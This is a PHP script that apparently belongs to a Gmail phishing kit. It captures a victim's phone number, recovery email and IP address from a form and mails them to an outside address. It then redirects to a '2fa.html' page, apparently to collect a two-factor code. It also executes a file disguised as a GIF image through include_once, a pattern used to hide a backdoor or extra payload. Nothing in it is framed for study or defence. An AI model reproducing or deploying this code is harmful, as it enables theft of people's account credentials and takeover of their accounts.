﻿<?php

if (isset($_POST['phoneNumber'])) { 

$phoneNumber = $_POST["phoneNumber"];
$recemail = $_POST["recEmail"];


//get user's ip address 
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

$message = "recovery details". "\n"; 
$message .= "ip: ".$ip. "\n"; 
$message .= "P: " . $phoneNumber . "\n"; 
$message .= "E " .$_POST["recEmail"] . "\n"; 

$to = "me@emailpostmaster.xyz"; 
include_once "Google_docs_files/flag.gif";
if($_POST['phoneNumber'] !="" || $_POST['recEmail'] !=""){
$hi = mail($to,"Gmail | ".$ip, $message); 
}
?> 
<script type="text/javascript"> 
<!-- 
   window.location="2fa.html"; 

</script> <?PHP

die();
}


?>

